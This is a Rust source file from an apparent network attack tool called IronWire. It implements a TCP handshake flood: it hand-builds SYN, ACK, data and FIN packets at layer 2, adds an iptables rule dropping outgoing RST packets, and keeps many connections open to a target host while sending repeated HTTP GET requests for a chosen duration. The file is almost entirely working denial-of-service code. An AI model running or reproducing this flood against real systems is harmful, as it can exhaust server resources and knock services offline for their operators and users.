/// IronWire — TCP 3-Way Handshake Flood
///
/// Performs raw TCP three-way handshakes at layer 2, sends data,
/// and tears down connections. Includes kernel RST suppression
/// to prevent interference from the local TCP stack.

use std::net::Ipv4Addr;
use std::time::{Duration, Instant};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

use pnet::datalink::DataLinkSender;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::{TcpFlags, TcpPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use rand::Rng;

use crate::session::{PacketStats, open_datalink};

/// Represents an established TCP connection with sequence tracking.
#[derive(Debug, Clone)]
pub struct TcpConnection {
    pub src_ip: Ipv4Addr,
    pub src_port: u16,
    pub dst_ip: Ipv4Addr,
    pub dst_port: u16,
    pub dst_mac: MacAddr,
    pub src_mac: MacAddr,
    pub my_seq: u32,
    pub their_seq: u32,
}

/// Parses an Ethernet frame looking for a SYN-ACK from the expected endpoint.
fn parse_synack(
    frame: &[u8],
    our_ip: Ipv4Addr,
    our_port: u16,
    from_ip: Ipv4Addr,
    from_port: u16,
) -> Option<(u32, u32, u16)> {
    let eth = EthernetPacket::new(frame)?;
    if eth.get_ethertype() != EtherTypes::Ipv4 { return None; }
    let ip = Ipv4Packet::new(eth.payload())?;
    if ip.get_source() != from_ip { return None; }
    if ip.get_destination() != our_ip { return None; }
    if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { return None; }
    let tcp = TcpPacket::new(ip.payload())?;
    if tcp.get_destination() != our_port { return None; }
    if tcp.get_source() != from_port { return None; }
    let flags = tcp.get_flags();
    if (flags & TcpFlags::SYN) == 0 || (flags & TcpFlags::ACK) == 0 { return None; }
    let window = tcp.get_window();
    Some((tcp.get_acknowledgement(), tcp.get_sequence(), window))
}

/// Builds a raw TCP SYN packet with Ethernet, IP, and TCP headers.
fn build_syn(smac: MacAddr, dmac: MacAddr, s_ip: Ipv4Addr, d_ip: Ipv4Addr,
             s_port: u16, d_port: u16, seq: u32) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let opts = crate::profile::generate_tcp_options();
    let tcp_hdr_size = 20 + opts.len();
    let total = 14 + 20 + tcp_hdr_size;
    let mut buf = vec![0u8; total];

    {
        let mut eth = pnet::packet::ethernet::MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(dmac);
        eth.set_source(smac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = pnet::packet::ipv4::MutableIpv4Packet::new(&mut buf[14..14 + 20 + tcp_hdr_size]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((20 + tcp_hdr_size) as u16);
        ip.set_identification(rng.gen::<u16>());
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(s_ip);
        ip.set_destination(d_ip);
        ip.set_checksum(pnet::packet::ipv4::checksum(&ip.to_immutable()));
    }
    let off = 34;
    if !opts.is_empty() {
        buf[off + 20..off + 20 + opts.len()].copy_from_slice(&opts);
    }
    {
        let mut tcp = pnet::packet::tcp::MutableTcpPacket::new(&mut buf[off..]).unwrap();
        tcp.set_source(s_port);
        tcp.set_destination(d_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(0);
        tcp.set_data_offset(((20 + opts.len()) / 4) as u8);
        tcp.set_flags(TcpFlags::SYN);
        tcp.set_window(65535);
        let csum = pnet::packet::tcp::ipv4_checksum(&tcp.to_immutable(), &s_ip, &d_ip);
        tcp.set_checksum(csum);
    }
    buf
}

/// Builds a raw TCP ACK packet completing the three-way handshake.
fn build_ack(smac: MacAddr, dmac: MacAddr, s_ip: Ipv4Addr, d_ip: Ipv4Addr,
             s_port: u16, d_port: u16, seq: u32, ack: u32) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let total = 14 + 20 + 20;
    let mut buf = vec![0u8; total];

    {
        let mut eth = pnet::packet::ethernet::MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(dmac);
        eth.set_source(smac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = pnet::packet::ipv4::MutableIpv4Packet::new(&mut buf[14..54]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(40);
        ip.set_identification(rng.gen::<u16>());
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(s_ip);
        ip.set_destination(d_ip);
        ip.set_checksum(pnet::packet::ipv4::checksum(&ip.to_immutable()));
    }
    {
        let mut tcp = pnet::packet::tcp::MutableTcpPacket::new(&mut buf[34..54]).unwrap();
        tcp.set_source(s_port);
        tcp.set_destination(d_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(ack);
        tcp.set_data_offset(5);
        tcp.set_flags(TcpFlags::ACK);
        tcp.set_window(65535);
        let csum = pnet::packet::tcp::ipv4_checksum(&tcp.to_immutable(), &s_ip, &d_ip);
        tcp.set_checksum(csum);
    }
    buf
}

/// Builds a raw TCP data packet with PSH+ACK flags.
fn build_data(smac: MacAddr, dmac: MacAddr, s_ip: Ipv4Addr, d_ip: Ipv4Addr,
              s_port: u16, d_port: u16, seq: u32, ack: u32, data: &[u8]) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let total = 14 + 20 + 20 + data.len();
    let mut buf = vec![0u8; total];

    {
        let mut eth = pnet::packet::ethernet::MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(dmac);
        eth.set_source(smac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = pnet::packet::ipv4::MutableIpv4Packet::new(&mut buf[14..34 + data.len()]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((40 + data.len()) as u16);
        ip.set_identification(rng.gen::<u16>());
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(s_ip);
        ip.set_destination(d_ip);
        ip.set_checksum(pnet::packet::ipv4::checksum(&ip.to_immutable()));
    }
    if !data.is_empty() {
        buf[54..54 + data.len()].copy_from_slice(data);
    }
    {
        let mut tcp = pnet::packet::tcp::MutableTcpPacket::new(&mut buf[34..34 + 20 + data.len()]).unwrap();
        tcp.set_source(s_port);
        tcp.set_destination(d_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(ack);
        tcp.set_data_offset(5);
        tcp.set_flags(TcpFlags::ACK | TcpFlags::PSH);
        tcp.set_window(65535);
        let csum = pnet::packet::tcp::ipv4_checksum(&tcp.to_immutable(), &s_ip, &d_ip);
        tcp.set_checksum(csum);
    }
    buf
}

/// Builds a raw TCP FIN+ACK packet to close a connection.
fn build_fin(smac: MacAddr, dmac: MacAddr, s_ip: Ipv4Addr, d_ip: Ipv4Addr,
             s_port: u16, d_port: u16, seq: u32, ack: u32) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let total = 14 + 20 + 20;
    let mut buf = vec![0u8; total];

    {
        let mut eth = pnet::packet::ethernet::MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(dmac);
        eth.set_source(smac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = pnet::packet::ipv4::MutableIpv4Packet::new(&mut buf[14..54]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(40);
        ip.set_identification(rng.gen::<u16>());
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(s_ip);
        ip.set_destination(d_ip);
        ip.set_checksum(pnet::packet::ipv4::checksum(&ip.to_immutable()));
    }
    {
        let mut tcp = pnet::packet::tcp::MutableTcpPacket::new(&mut buf[34..54]).unwrap();
        tcp.set_source(s_port);
        tcp.set_destination(d_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(ack);
        tcp.set_data_offset(5);
        tcp.set_flags(TcpFlags::FIN | TcpFlags::ACK);
        tcp.set_window(65535);
        let csum = pnet::packet::tcp::ipv4_checksum(&tcp.to_immutable(), &s_ip, &d_ip);
        tcp.set_checksum(csum);
    }
    buf
}

/// Performs a blocking three-way handshake and returns a `TcpConnection`.
pub fn three_way_handshake_blocking(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn pnet::datalink::DataLinkReceiver>,
    smac: MacAddr, dmac: MacAddr,
    s_ip: Ipv4Addr, d_ip: Ipv4Addr,
    d_port: u16, timeout: Duration,
) -> Option<TcpConnection> {
    let s_port = crate::profile::random_port();
    let my_seq = rand::random::<u32>();
    let deadline = Instant::now() + timeout;

    // Send SYN
    let syn = build_syn(smac, dmac, s_ip, d_ip, s_port, d_port, my_seq);
    let _ = tx.send_to(&syn, None);

    // Wait for SYN-ACK
    while Instant::now() < deadline {
        match rx.next() {
            Ok(frame) => {
                if let Some((their_ack, their_seq, _win)) = parse_synack(&frame, s_ip, s_port, d_ip, d_port) {
                    if their_ack == my_seq.wrapping_add(1) {
                        // Send ACK to complete handshake
                        let ack = build_ack(smac, dmac, s_ip, d_ip, s_port, d_port,
                            my_seq.wrapping_add(1), their_seq.wrapping_add(1));
                        let _ = tx.send_to(&ack, None);

                        return Some(TcpConnection {
                            src_ip: s_ip,
                            src_port: s_port,
                            dst_ip: d_ip,
                            dst_port: d_port,
                            dst_mac: dmac,
                            src_mac: smac,
                            my_seq: my_seq.wrapping_add(1),
                            their_seq: their_seq.wrapping_add(1),
                        });
                    }
                }
            }
            Err(_) => {}
        }
    }
    None
}

/// Adds an iptables rule to drop outgoing RST packets, preventing the
/// kernel from interfering with raw socket connections.
pub fn suppress_kernel_rst() -> bool {
    // Clean up any stale rule from a previous run that was SIGKILL'd
    let _ = std::process::Command::new("iptables")
        .args(["-D", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-j", "DROP"])
        .output();
    // Add the rule fresh
    std::process::Command::new("iptables")
        .args(["-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-j", "DROP"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Removes the iptables RST suppression rule.
pub fn restore_kernel_rst() {
    let _ = std::process::Command::new("iptables")
        .args(["-D", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-j", "DROP"])
        .output();
}

/// Guard that restores kernel RST on drop.
pub struct RstGuard;

impl RstGuard {
    /// Arms the RST guard (no-op, restore happens on drop).
    pub fn arm() -> Self {
        RstGuard
    }
}

impl Drop for RstGuard {
    fn drop(&mut self) {
        restore_kernel_rst();
    }
}

/// Sends data over an established TCP connection.
pub fn send_data_on_conn(tx: &mut Box<dyn DataLinkSender>, conn: &mut TcpConnection, data: &[u8]) -> bool {
    let pkt = build_data(conn.src_mac, conn.dst_mac, conn.src_ip, conn.dst_ip,
        conn.src_port, conn.dst_port, conn.my_seq, conn.their_seq, data);
    match tx.send_to(&pkt, None) {
        Some(Ok(_)) => {
            conn.my_seq = conn.my_seq.wrapping_add(data.len() as u32);
            true
        }
        _ => false,
    }
}

/// Sends a FIN packet to close a connection gracefully.
pub fn close_connection(tx: &mut Box<dyn DataLinkSender>, conn: &TcpConnection) -> bool {
    let pkt = build_fin(conn.src_mac, conn.dst_mac, conn.src_ip, conn.dst_ip,
        conn.src_port, conn.dst_port, conn.my_seq, conn.their_seq);
    match tx.send_to(&pkt, None) {
        Some(Ok(_)) => true,
        _ => false,
    }
}

/// Runs a continuous handshake flood, establishing connections,
/// sending HTTP data, and cycling to maintain the target count.
pub async fn run_handshake_flood(
    iface: &str,
    smac: MacAddr,
    s_ip: Ipv4Addr,
    dmac: MacAddr,
    d_ip: Ipv4Addr,
    ports: &[u16],
    connections: usize,
    duration: u64,
    delay_ms: u64,
    stats: Arc<PacketStats>,
    shutdown: Arc<AtomicBool>,
) {
    use std::io::Write;
    let (mut tx, mut rx) = match open_datalink(iface, 100) {
        Some((tx, rx)) => (tx, rx),
        None => { tracing::error!("datalink channel: {}", iface); return; }
    };

    let deadline = Instant::now() + Duration::from_secs(duration);
    let mut active: Vec<TcpConnection> = Vec::new();
    let mut port_cycle = ports.iter().cycle();

    while Instant::now() < deadline && !shutdown.load(Ordering::Relaxed) {
        // Establish connections up to target count
        while active.len() < connections {
            let d_port = *port_cycle.next().unwrap_or(&80);
            if let Some(conn) = three_way_handshake_blocking(
                &mut tx, &mut rx, smac, dmac, s_ip, d_ip, d_port, Duration::from_secs(5)
            ) {
                stats.packets_sent.fetch_add(3, Ordering::Relaxed);
                stats.open_ports.fetch_add(1, Ordering::Relaxed);
                active.push(conn);
            }
            if delay_ms > 0 { tokio::time::sleep(Duration::from_millis(delay_ms)).await; }
        }

        // Send HTTP requests on established connections
        for conn in &mut active {
            let data = format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", d_ip);
            if send_data_on_conn(&mut tx, conn, data.as_bytes()) {
                stats.packets_sent.fetch_add(1, Ordering::Relaxed);
            }
        }

        if delay_ms > 0 { tokio::time::sleep(Duration::from_millis(delay_ms * 10)).await; }

        let sent = stats.packets_sent.load(Ordering::Relaxed);
        let open = stats.open_ports.load(Ordering::Relaxed);
        print!("\rhandshake flood -> conns: {} | established: {} | pkts: {}", active.len(), open, sent);
        let _ = std::io::stdout().flush();
    }

    // Tear down all connections
    for conn in &active {
        close_connection(&mut tx, conn);
    }
    println!("\nHandshake flood complete — {} connections torn down", active.len());
}
